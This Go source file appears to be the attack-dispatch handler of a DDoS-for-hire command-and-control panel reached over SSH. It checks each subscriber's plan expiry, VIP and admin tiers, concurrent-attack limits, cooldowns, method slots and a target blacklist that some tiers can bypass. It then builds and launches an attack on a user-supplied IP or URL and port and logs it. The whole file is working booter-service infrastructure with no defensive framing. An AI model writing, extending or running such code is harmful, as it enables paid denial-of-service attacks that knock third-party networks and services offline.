package handlers

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gliderlabs/ssh"
)

func AttackHandler(db *database.Database, session ssh.Session, args []string) {
	// Load configuration
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Fatalf("failed to load config: %v", err)
	}

	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}
	methods := utils.GetMethodsList()

	// Ensure method exists and permissions are valid
	if !managers.Contains(methods, args[0]) {
		return
	}

	if len(args) < 4 {
		// If only the method is provided (or fewer than 4 arguments), return an error message
		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, invalidUsage+"\u001B[0m", true)
		return
	}

	// Check for expired account
	if db.IsAccountExpired(session.User()) {
		utils.SendMessage(session, "\u001B[91mYour plan has expired.\u001B[0m", true)
		return
	}

	// Check if attacks are enabled
	attacks_disabled := utils.Branding(session, "attacks-disabled", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})

	if !config.Attacks_enabled && userInfo.Admin != 1 {
		utils.SendMessage(session, attacks_disabled, true)
		return
	}

	// Validate target format
	if len(args) > 1 && !isValidTarget(args[1]) {
		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, invalidUsage, true)
		return
	}

	// Handle blacklist
	if isBlacklisted(db, session, args) {
		lm, err := managers.NewLogManager("./assets/logs/logs.json")
		if err != nil {
			fmt.Println("Error initializing LogManager:", err)
			os.Exit(1)
		}
		defer lm.Close()

		lm.Log("User tried to attack blocked target (C2)!\nUsername: " + session.User() + "\nTarget: " + args[1] + "\nPort: " + args[2] + "\nTime: " + args[3] + "\nMethod: " + args[0] + "\n----------------------")
		blocked_target := utils.Branding(session, "blocked-target", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, blocked_target, true)
		return
	}

	// Check for spam protection
	if userInfo.BypassSpam != 1 && db.IsSpamming(session.User()) {
		spam_prot := utils.Branding(session, "spam-protection", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, spam_prot, true)
		return
	}

	// Slot and attack validation
	if !validateSlots(db, session, config, args[0], userInfo) {
		return
	}

	// Cooldown checks
	if !checkCooldowns(db, session, config, userInfo) {
		return
	}

	// Concurrents limit
	if db.GetUserCurrentAttacksCount(session.User()) >= userInfo.Concurrents {
		concurents_max := utils.Branding(session, "concurrents-limit", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, concurents_max, true)
		return
	}
	if userInfo.PowerSaving != 1 {
		if db.IsTargetCurrentlyUnderAttack(args[1]) {
			target_underatk := utils.Branding(session, "target-under-attack", map[string]interface{}{
				"user.Username":            session.User(),
				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
				"user.Admin":               utils.CalculateInt(userInfo.Admin),
				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
				"user.Private":             utils.CalculateInt(userInfo.Private),
				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
				"user.SSH_Client":          session.Context().ClientVersion(),
				"user.Created_by":          userInfo.CreatedBy,
				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
				"clear":                    "\x1b[2J \x1b[H",
				"sleep": func(duration int) {
					time.Sleep(time.Duration(duration) * time.Millisecond)
				},
			})
			utils.SendMessage(session, target_underatk, true)
			return
		}
	}

	// Prepare attack parameters
	vip := userInfo.Vip == 1
	private := userInfo.Private == 1
	admin := userInfo.Admin == 1
	maxtime := userInfo.Maxtime

	// Initialize the attack
	atk, err := managers.NewAttack(session, args, vip, private, admin, maxtime, db)
	if err != nil {
		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		return
	}

	// Execute the attack
	isError, errMsg, msg := atk.Build(session, db)
	if isError {
		utils.SendMessage(session, fmt.Sprintf("\u001B[91m%s\u001B[0m", errMsg.Error()), true)
	} else {
		utils.SendMessage(session, msg, true)
		db.LogAttack(session.User(), atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
		// Optionally log to external webhook if configured
		// utils.LogWebhook(config.Attacks, fmt.Sprintf("%s:%s just sent attack (target: %s | method: %s)", session.User(), userIp, atk.Target, atk.MethodName))
	}
}

// Helper functions

func isValidTarget(target string) bool {
	return strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || managers.ValidIP4(target)
}

func isBlacklisted(db *database.Database, session ssh.Session, args []string) bool {
	blockedIPS := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
	for _, blockedIP := range blockedIPS {
		if args[1] == blockedIP || (strings.Contains(blockedIP, ".gov") && strings.Contains(args[1], ".gov")) || (strings.Contains(blockedIP, ".edu") && strings.Contains(args[1], ".edu")) {
			return true
		}
	}
	return false
}

func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
	currentAttacks := db.GetCurrentAttacksLength()

	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil {
		utils.SendMessage(session, "\u001B[91mMethod configuration not found\u001B[0m", true)
		return false
	}

	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
		utils.SendMessage(session, "\u001B[91mAll slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!\u001B[0m", true)
		return false
	}

	if currentAttacks > config.Global_slots {
		utils.SendMessage(session, "\u001B[91mGlobal network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use\u001B[0m", true)
		return false
	}
	return true
}

func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Config, userInfo database.AccountInfo) bool {
	if userInfo.Admin != 1 {
		// Check user-specific cooldown
		if cooldown := db.HowLongOnCooldown(session.User(), userInfo.Cooldown); cooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on cooldown. (%d seconds left)\u001B[0m", cooldown), true)
			return false
		}

		// Check global cooldown
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on global cooldown. (%d seconds left)\u001B[0m", globalCooldown), true)
			return false
		}
	}
	return true
}
